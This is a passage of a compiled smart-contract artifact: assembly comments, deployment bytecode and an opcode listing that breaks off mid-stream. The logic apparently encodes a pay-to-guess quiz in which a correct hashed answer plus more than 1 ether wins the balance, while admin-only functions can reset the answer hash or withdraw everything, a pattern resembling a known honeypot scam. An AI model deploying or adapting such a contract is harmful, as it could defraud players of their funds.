\"#utility.yul\":6099:6115   */\n      swap1\n      pop\n        /* \"#utility.yul\":6044:6121   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6127:6249   */\n    tag_95:\n        /* \"#utility.yul\":6200:6224   */\n      tag_175\n        /* \"#utility.yul\":6218:6223   */\n      dup2\n        /* \"#utility.yul\":6200:6224   */\n      tag_94\n      jump\t// in\n    tag_175:\n        /* \"#utility.yul\":6193:6198   */\n      dup2\n        /* \"#utility.yul\":6190:6225   */\n      eq\n        /* \"#utility.yul\":6180:6243   */\n      tag_176\n      jumpi\n        /* \"#utility.yul\":6239:6240   */\n      0x00\n        /* \"#utility.yul\":6236:6237   */\n      dup1\n        /* \"#utility.yul\":6229:6241   */\n      revert\n        /* \"#utility.yul\":6180:6243   */\n    tag_176:\n        /* \"#utility.yul\":6127:6249   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6255:6394   */\n    tag_96:\n        /* \"#utility.yul\":6301:6306   */\n      0x00\n        /* \"#utility.yul\":6339:6345   */\n      dup2\n        /* \"#utility.yul\":6326:6346   */\n      calldataload\n        /* \"#utility.yul\":6317:6346   */\n      swap1\n      pop\n        /* \"#utility.yul\":6355:6388   */\n      tag_178\n        /* \"#utility.yul\":6382:6387   */\n      dup2\n        /* \"#utility.yul\":6355:6388   */\n      tag_95\n      jump\t// in\n    tag_178:\n        /* \"#utility.yul\":6255:6394   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6400:7074   */\n    tag_28:\n        /* \"#utility.yul\":6480:6486   */\n      0x00\n        /* \"#utility.yul\":6488:6494   */\n      dup1\n        /* \"#utility.yul\":6496:6502   */\n      0x00\n        /* \"#utility.yul\":6545:6547   */\n      0x40\n        /* \"#utility.yul\":6533:6542   */\n      dup5\n        /* \"#utility.yul\":6524:6531   */\n      dup7\n        /* \"#utility.yul\":6520:6543   */\n      sub\n        /* \"#utility.yul\":6516:6548   */\n      slt\n        /* \"#utility.yul\":6513:6632   */\n      iszero\n      tag_180\n      jumpi\n        /* \"#utility.yul\":6551:6630   */\n      tag_181\n      tag_75\n      jump\t// in\n    tag_181:\n        /* \"#utility.yul\":6513:6632   */\n    tag_180:\n        /* \"#utility.yul\":6699:6700   */\n      0x00\n        /* \"#utility.yul\":6688:6697   */\n      dup5\n        /* \"#utility.yul\":6684:6701   */\n      add\n        /* \"#utility.yul\":6671:6702   */\n      calldataload\n        /* \"#utility.yul\":6729:6747   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":6721:6727   */\n      dup2\n        /* \"#utility.yul\":6718:6748   */\n      gt\n        /* \"#utility.yul\":6715:6832   */\n      iszero\n      tag_182\n      jumpi\n        /* \"#utility.yul\":6751:6830   */\n      tag_183\n      tag_76\n      jump\t// in\n    tag_183:\n        /* \"#utility.yul\":6715:6832   */\n    tag_182:\n        /* \"#utility.yul\":6864:6929   */\n      tag_184\n        /* \"#utility.yul\":6921:6928   */\n      dup7\n        /* \"#utility.yul\":6912:6918   */\n      dup3\n        /* \"#utility.yul\":6901:6910   */\n      dup8\n        /* \"#utility.yul\":6897:6919   */\n      add\n        /* \"#utility.yul\":6864:6929   */\n      tag_93\n      jump\t// in\n    tag_184:\n        /* \"#utility.yul\":6846:6929   */\n      swap4\n      pop\n      swap4\n      pop\n        /* \"#utility.yul\":6642:6939   */\n      pop\n        /* \"#utility.yul\":6978:6980   */\n      0x20\n        /* \"#utility.yul\":7004:7057   */\n      tag_185\n        /* \"#utility.yul\":7049:7056   */\n      dup7\n        /* \"#utility.yul\":7040:7046   */\n      dup3\n        /* \"#utility.yul\":7029:7038   */\n      dup8\n        /* \"#utility.yul\":7025:7047   */\n      add\n        /* \"#utility.yul\":7004:7057   */\n      tag_96\n      jump\t// in\n    tag_185:\n        /* \"#utility.yul\":6994:7057   */\n      swap2\n      pop\n        /* \"#utility.yul\":6949:7067   */\n      pop\n        /* \"#utility.yul\":6400:7074   */\n      swap3\n      pop\n      swap3\n      pop\n      swap3\n      jump\t// out\n        /* \"#utility.yul\":7080:7260   */\n    tag_97:\n        /* \"#utility.yul\":7128:7205   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":7125:7126   */\n      0x00\n        /* \"#utility.yul\":7118:7206   */\n      mstore\n        /* \"#utility.yul\":7225:7229   */\n      0x22\n        /* \"#utility.yul\":7222:7223   */\n      0x04\n        /* \"#utility.yul\":7215:7230   */\n      mstore\n        /* \"#utility.yul\":7249:7253   */\n      0x24\n        /* \"#utility.yul\":7246:7247   */\n      0x00\n        /* \"#utility.yul\":7239:7254   */\n      revert\n        /* \"#utility.yul\":7266:7586   */\n    tag_38:\n        /* \"#utility.yul\":7310:7316   */\n      0x00\n        /* \"#utility.yul\":7347:7348   */\n      0x02\n        /* \"#utility.yul\":7341:7345   */\n      dup3\n        /* \"#utility.yul\":7337:7349   */\n      div\n        /* \"#utility.yul\":7327:7349   */\n      swap1\n      pop\n        /* \"#utility.yul\":7394:7395   */\n      0x01\n        /* \"#utility.yul\":7388:7392   */\n      dup3\n        /* \"#utility.yul\":7384:7396   */\n      and\n        /* \"#utility.yul\":7415:7433   */\n      dup1\n        /* \"#utility.yul\":7405:7486   */\n      tag_188\n      jumpi\n        /* \"#utility.yul\":7471:7475   */\n      0x7f\n        /* \"#utility.yul\":7463:7469   */\n      dup3\n        /* \"#utility.yul\":7459:7476   */\n      and\n        /* \"#utility.yul\":7449:7476   */\n      swap2\n      pop\n        /* \"#utility.yul\":7405:7486   */\n    tag_188:\n        /* \"#utility.yul\":7533:7535   */\n      0x20\n        /* \"#utility.yul\":7525:7531   */\n      dup3\n        /* \"#utility.yul\":7522:7536   */\n      lt\n        /* \"#utility.yul\":7502:7520   */\n      dup2\n        /* \"#utility.yul\":7499:7537   */\n      eq\n        /* \"#utility.yul\":7496:7580   */\n      iszero\n      tag_189\n      jumpi\n        /* \"#utility.yul\":7552:7570   */\n      tag_190\n      tag_97\n      jump\t// in\n    tag_190:\n        /* \"#utility.yul\":7496:7580   */\n    tag_189:\n        /* \"#utility.yul\":7317:7586   */\n      pop\n        /* \"#utility.yul\":7266:7586   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7592:7718   */\n    tag_98:\n        /* \"#utility.yul\":7629:7636   */\n      0x00\n        /* \"#utility.yul\":7669:7711   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":7662:7667   */\n      dup3\n        /* \"#utility.yul\":7658:7712   */\n      and\n        /* \"#utility.yul\":7647:7712   */\n      swap1\n      pop\n        /* \"#utility.yul\":7592:7718   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7724:7820   */\n    tag_99:\n        /* \"#utility.yul\":7761:7768   */\n      0x00\n        /* \"#utility.yul\":7790:7814   */\n      tag_193\n        /* \"#utility.yul\":7808:7813   */\n      dup3\n        /* \"#utility.yul\":7790:7814   */\n      tag_98\n      jump\t// in\n    tag_193:\n        /* \"#utility.yul\":7779:7814   */\n      swap1\n      pop\n        /* \"#utility.yul\":7724:7820   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7826:7920   */\n    tag_100:\n        /* \"#utility.yul\":7859:7867   */\n      0x00\n        /* \"#utility.yul\":7907:7912   */\n      dup2\n        /* \"#utility.yul\":7903:7905   */\n      0x60\n        /* \"#utility.yul\":7899:7913   */\n      shl\n        /* \"#utility.yul\":7878:7913   */\n      swap1\n      pop\n        /* \"#utility.yul\":7826:7920   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":7926:8020   */\n    tag_101:\n        /* \"#utility.yul\":7965:7972   */\n      0x00\n        /* \"#utility.yul\":7994:8014   */\n      tag_196\n        /* \"#utility.yul\":8008:8013   */\n      dup3\n        /* \"#utility.yul\":7994:8014   */\n      tag_100\n      jump\t// in\n    tag_196:\n        /* \"#utility.yul\":7983:8014   */\n      swap1\n      pop\n        /* \"#utility.yul\":7926:8020   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8026:8126   */\n    tag_102:\n        /* \"#utility.yul\":8065:8072   */\n      0x00\n        /* \"#utility.yul\":8094:8120   */\n      tag_198\n        /* \"#utility.yul\":8114:8119   */\n      dup3\n        /* \"#utility.yul\":8094:8120   */\n      tag_101\n      jump\t// in\n    tag_198:\n        /* \"#utility.yul\":8083:8120   */\n      swap1\n      pop\n        /* \"#utility.yul\":8026:8126   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8132:8289   */\n    tag_103:\n        /* \"#utility.yul\":8237:8282   */\n      tag_200\n        /* \"#utility.yul\":8257:8281   */\n      tag_201\n        /* \"#utility.yul\":8275:8280   */\n      dup3\n        /* \"#utility.yul\":8257:8281   */\n      tag_99\n      jump\t// in\n    tag_201:\n        /* \"#utility.yul\":8237:8282   */\n      tag_102\n      jump\t// in\n    tag_200:\n        /* \"#utility.yul\":8232:8235   */\n      dup3\n        /* \"#utility.yul\":8225:8283   */\n      mstore\n        /* \"#utility.yul\":8132:8289   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8295:8551   */\n    tag_45:\n        /* \"#utility.yul\":8407:8410   */\n      0x00\n        /* \"#utility.yul\":8422:8497   */\n      tag_203\n        /* \"#utility.yul\":8493:8496   */\n      dup3\n        /* \"#utility.yul\":8484:8490   */\n      dup5\n        /* \"#utility.yul\":8422:8497   */\n      tag_103\n      jump\t// in\n    tag_203:\n        /* \"#utility.yul\":8522:8524   */\n      0x14\n        /* \"#utility.yul\":8517:8520   */\n      dup3\n        /* \"#utility.yul\":8513:8525   */\n      add\n        /* \"#utility.yul\":8506:8525   */\n      swap2\n      pop\n        /* \"#utility.yul\":8542:8545   */\n      dup2\n        /* \"#utility.yul\":8535:8545   */\n      swap1\n      pop\n        /* \"#utility.yul\":8295:8551   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8581:8885   */\n    tag_104:\n        /* \"#utility.yul\":8679:8682   */\n      0x00\n        /* \"#utility.yul\":8700:8771   */\n      tag_205\n        /* \"#utility.yul\":8764:8770   */\n      dup4\n        /* \"#utility.yul\":8759:8762   */\n      dup6\n        /* \"#utility.yul\":8700:8771   */\n      tag_88\n      jump\t// in\n    tag_205:\n        /* \"#utility.yul\":8693:8771   */\n      swap4\n      pop\n        /* \"#utility.yul\":8781:8824   */\n      tag_206\n        /* \"#utility.yul\":8817:8823   */\n      dup4\n        /* \"#utility.yul\":8812:8815   */\n      dup6\n        /* \"#utility.yul\":8805:8810   */\n      dup5\n        /* \"#utility.yul\":8781:8824   */\n      tag_84\n      jump\t// in\n    tag_206:\n        /* \"#utility.yul\":8849:8878   */\n      tag_207\n        /* \"#utility.yul\":8871:8877   */\n      dup4\n        /* \"#utility.yul\":8849:8878   */\n      tag_79\n      jump\t// in\n    tag_207:\n        /* \"#utility.yul\":8844:8847   */\n      dup5\n        /* \"#utility.yul\":8840:8879   */\n      add\n        /* \"#utility.yul\":8833:8879   */\n      swap1\n      pop\n        /* \"#utility.yul\":8581:8885   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":8891:9224   */\n    tag_56:\n        /* \"#utility.yul\":9014:9018   */\n      0x00\n        /* \"#utility.yul\":9052:9054   */\n      0x20\n        /* \"#utility.yul\":9041:9050   */\n      dup3\n        /* \"#utility.yul\":9037:9055   */\n      add\n        /* \"#utility.yul\":9029:9055   */\n      swap1\n      pop\n        /* \"#utility.yul\":9101:9110   */\n      dup2\n        /* \"#utility.yul\":9095:9099   */\n      dup2\n        /* \"#utility.yul\":9091:9111   */\n      sub\n        /* \"#utility.yul\":9087:9088   */\n      0x00\n        /* \"#utility.yul\":9076:9085   */\n      dup4\n        /* \"#utility.yul\":9072:9089   */\n      add\n        /* \"#utility.yul\":9065:9112   */\n      mstore\n        /* \"#utility.yul\":9129:9217   */\n      tag_209\n        /* \"#utility.yul\":9212:9216   */\n      dup2\n        /* \"#utility.yul\":9203:9209   */\n      dup5\n        /* \"#utility.yul\":9195:9201   */\n      dup7\n        /* \"#utility.yul\":9129:9217   */\n      tag_104\n      jump\t// in\n    tag_209:\n        /* \"#utility.yul\":9121:9217   */\n      swap1\n      pop\n        /* \"#utility.yul\":8891:9224   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220262c1903358007379951ee1b0a34d601f0a05d392bd70d3f8628196634d598bc64736f6c634300080a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b5060405162000d5b38038062000d5b83398181016040528101906200003791906200026f565b60005b8151811015620000a35760016002600084848151811062000060576200005f620002c0565b5b6020026020010151815260200190815260200160002060006101000a81548160ff02191690831515021790555080806200009a9062000328565b9150506200003a565b505062000376565b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6200010f82620000c4565b810181811067ffffffffffffffff82111715620001315762000130620000d5565b5b80604052505050565b600062000146620000ab565b905062000154828262000104565b919050565b600067ffffffffffffffff821115620001775762000176620000d5565b5b602082029050602081019050919050565b600080fd5b6000819050919050565b620001a2816200018d565b8114620001ae57600080fd5b50565b600081519050620001c28162000197565b92915050565b6000620001df620001d98462000159565b6200013a565b9050808382526020820190506020840283018581111562000205576200020462000188565b5b835b818110156200023257806200021d8882620001b1565b84526020840193505060208101905062000207565b5050509392505050565b600082601f830112620002545762000253620000bf565b5b815162000266848260208601620001c8565b91505092915050565b600060208284031215620002885762000287620000b5565b5b600082015167ffffffffffffffff811115620002a957620002a8620000ba565b5b620002b7848285016200023c565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b600062000335826200031e565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156200036b576200036a620002ef565b5b600182019050919050565b6109d580620003866000396000f3fe60806040526004361061004e5760003560e01c80633853682c1461005e5780633fad9ae01461007a578063bedf0f4a146100a5578063c76de3e9146100af578063ed8df164146100cb5761004f565b5b34801561005b57600080fd5b50005b610078600480360381019061007391906105ee565b6100e7565b005b34801561008657600080fd5b5061008f6101ad565b60405161009c91906106bf565b60405180910390f35b6100ad61023b565b005b6100c960048036038101906100c49190610741565b6102de565b005b6100e560048036038101906100e091906107f8565b610383565b005b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461011f57600080fd5b8060405160200161013091906106bf565b6040516020818303038152906040528051906020012060015414801561015d5750670de0b6b3a764000034115b156101aa573373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101a8573d6000803e3d6000fd5b505b50565b600080546101ba90610887565b80601f01602080910402602001604051908101604052809291908181526020018280546101e690610887565b80156102335780601f1061020857610100808354040283529160200191610233565b820191906000526020600020905b81548152906001019060200180831161021657829003601f168201915b505050505081565b60026000336040516020016102509190610933565b60405160208183030381529060405280519060200120815260200190815260200160002060009054906101000a900460ff1661028b57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156102d1573d6000803e3d6000fd5b506000801b600181905550565b60026000336040516020016102f39190610933565b60405160208183030381529060405280519060200120815260200190815260200160002060009054906101000a900460ff1661032e57600080fd5b6000801b600154141561037d57818160405160200161034e92919061097b565b6040516020818303038152906040528051906020012060018190555083836000919061037b9291906103f1565b505b50505050565b60026000336040516020016103989190610933565b60405160208183030381529060405280519060200120815260200190815260200160002060009054906101000a900460ff166103d357600080fd5b8282600091906103e49291906103f1565b5080600181905550505050565b8280546103fd90610887565b90600052602060002090601f01602090048101928261041f5760008555610466565b82601f1061043857803560ff1916838001178555610466565b82800160010185558215610466579182015b8281111561046557823582559160200191906001019061044a565b5b5090506104739190610477565b5090565b5b80821115610490576000816000905550600101610478565b5090565b6000604051905090565b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6104fb826104b2565b810181811067ffffffffffffffff8211171561051a576105196104c3565b5b80604052505050565b600061052d610494565b905061053982826104f2565b919050565b600067ffffffffffffffff821115610559576105586104c3565b5b610562826104b2565b9050602081019050919050565b82818337600083830152505050565b600061059161058c8461053e565b610523565b9050828152602081018484840111156105ad576105ac6104ad565b5b6105b884828561056f565b509392505050565b600082601f8301126105d5576105d46104a8565b5b81356105e584826020860161057e565b91505092915050565b6000602082840312156106045761060361049e565b5b600082013567ffffffffffffffff811115610622576106216104a3565b5b61062e848285016105c0565b91505092915050565b600081519050919050565b600082825260208201905092915050565b60005b83811015610671578082015181840152602081019050610656565b83811115610680576000848401525b50505050565b600061069182610637565b61069b8185610642565b93506106ab818560208601610653565b6106b4816104b2565b840191505092915050565b600060208201905081810360008301526106d98184610686565b905092915050565b600080fd5b600080fd5b60008083601f840112610701576107006104a8565b5b8235905067ffffffffffffffff81111561071e5761071d6106e1565b5b60208301915083600182028301111561073a576107396106e6565b5b9250929050565b6000806000806040858703121561075b5761075a61049e565b5b600085013567ffffffffffffffff811115610779576107786104a3565b5b610785878288016106eb565b9450945050602085013567ffffffffffffffff8111156107a8576107a76104a3565b5b6107b4878288016106eb565b925092505092959194509250565b6000819050919050565b6107d5816107c2565b81146107e057600080fd5b50565b6000813590506107f2816107cc565b92915050565b6000806000604084860312156108115761081061049e565b5b600084013567ffffffffffffffff81111561082f5761082e6104a3565b5b61083b868287016106eb565b9350935050602061084e868287016107e3565b9150509250925092565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b6000600282049050600182168061089f57607f821691505b602082108114156108b3576108b2610858565b5b50919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006108e4826108b9565b9050919050565b60008160601b9050919050565b6000610903826108eb565b9050919050565b6000610915826108f8565b9050919050565b61092d610928826108d9565b61090a565b82525050565b600061093f828461091c565b60148201915081905092915050565b600061095a8385610642565b935061096783858461056f565b610970836104b2565b840190509392505050565b6000602082019050818103600083015261099681848661094e565b9050939250505056fea2646970667358221220262c1903358007379951ee1b0a34d601f0a05d392bd70d3f8628196634d598bc64736f6c634300080a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xD5B CODESIZE SUB DUP1 PUSH3 0xD5B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x37 SWAP2 SWAP1 PUSH3 0x26F JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP2 MLOAD DUP2 LT ISZERO PUSH3 0xA3 JUMPI PUSH1 0x1 PUSH1 0x2 PUSH1 0x0 DUP5 DUP5 DUP2 MLOAD DUP2 LT PUSH3 0x60 JUMPI PUSH3 0x5F PUSH3 0x2C0 JUMP JUMPDEST JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP DUP1 DUP1 PUSH3 0x9A SWAP1 PUSH3 0x328 JUMP JUMPDEST SWAP2 POP POP PUSH3 0x3A JUMP JUMPDEST POP POP PUSH3 0x376 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH3 0x10F DUP3 PUSH3 0xC4 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH3 0x131 JUMPI PUSH3 0x130 PUSH3 0xD5 JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x146 PUSH3 0xAB JUMP JUMPDEST SWAP1 POP PUSH3 0x154 DUP3 DUP3 PUSH3 0x104 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH3 0x177 JUMPI PUSH3 0x176 PUSH3 0xD5 JUMP JUMPDEST JUMPDEST PUSH1 0x20 DUP3 MUL SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH3 0x1A2 DUP2 PUSH3 0x18D JUMP JUMPDEST DUP2 EQ PUSH3 0x1AE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH3 0x1C2 DUP2 PUSH3 0x197 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x1DF PUSH3 0x1D9 DUP5 PUSH3 0x159 JUMP JUMPDEST PUSH3 0x13A JUMP JUMPDEST SWAP1 POP DUP1 DUP4 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH1 0x20 DUP5 MUL DUP4 ADD DUP6 DUP2 GT ISZERO PUSH3 0x205 JUMPI PUSH3 0x204 PUSH3 0x188 JUMP JUMPDEST JUMPDEST DUP4 JUMPDEST DUP2 DUP2 LT ISZERO PUSH3 0x232 JUMPI DUP1 PUSH3 0x21D DUP9 DUP3 PUSH3 0x1B1 JUMP JUMPDEST DUP5 MSTORE PUSH1 0x20 DUP5 ADD SWAP4 POP POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH3 0x207 JUMP JUMPDEST POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH3 0x254 JUMPI PUSH3 0x253 PUSH3 0xBF JUMP JUMPDEST JUMPDEST DUP2 MLOAD PUSH3 0x266 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH3 0x1C8 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH3 0x288 JUMPI PUSH3 0x287 PUSH3 0xB5 JUMP JUMPDEST JUMPDEST PUSH1 0x0 DUP3 ADD MLOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH3 0x2A9 JUMPI PUSH3 0x2A8 PUSH3 0xBA JUMP JUMPDEST JUMPDEST PUSH3 0x2B7 DUP5 DUP3 DUP6 ADD PUSH3 0x23C JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x335 DUP3 PUSH3 0x31E JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH3 0x36B JUMPI PUSH3 0x36A PUSH3 0x2EF JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9D5 DUP1 PUSH3 0x386 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4E JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3853682C EQ PUSH2 0x5E JUMPI DUP1 PUSH4 0x3FAD9AE0 EQ PUSH2 0x7A JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0xA5 JUMPI DUP1 PUSH4 0xC76DE3E9 EQ PUSH2 0xAF JUMPI DUP1 PUSH4 0xED8DF164 EQ PUSH2 0xCB JUMPI PUSH2 0x4F JUMP JUMPDEST JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP STOP JUMPDEST PUSH2 0x78 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x73 SWAP2 SWAP1 PUSH2 0x5EE JUMP JUMPDEST PUSH2 0xE7 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x86 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x8F PUSH2 0x1AD JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x9C SWAP2 SWAP1 PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xAD PUSH2 0x23B JUMP JUMPDEST STOP JUMPDEST PUSH2 0xC9 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xC4 SWAP2 SWAP1 PUSH2 0x741 JUMP JUMPDEST PUSH2 0x2DE JUMP JUMPDEST STOP JUMPDEST PUSH2 0xE5 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0xE0 SWAP2 SWAP1 PUSH2 0x7F8 JUMP JUMPDEST PUSH2 0x383 JUMP JUMPDEST STOP JUMPDEST ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x11F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x130 SWAP2 SWAP1 PUSH2 0x6BF JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0x1 SLOAD EQ DUP1 ISZERO PUSH2 0x15D JUMPI POP PUSH8 0xDE0B6B3A7640000 CALLVALUE GT JUMPDEST ISZERO PUSH2 0x1AA JUMPI CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x1A8 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH2 0x1BA SWAP1 PUSH2 0x887 JUMP JUMPDEST DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH2 0x1E6 SWAP1 PUSH2 0x887 JUMP JUMPDEST DUP1 ISZERO PUSH2 0x233 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x208 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x233 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x216 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP DUP2 JUMP JUMPDEST PUSH1 0x2 PUSH1 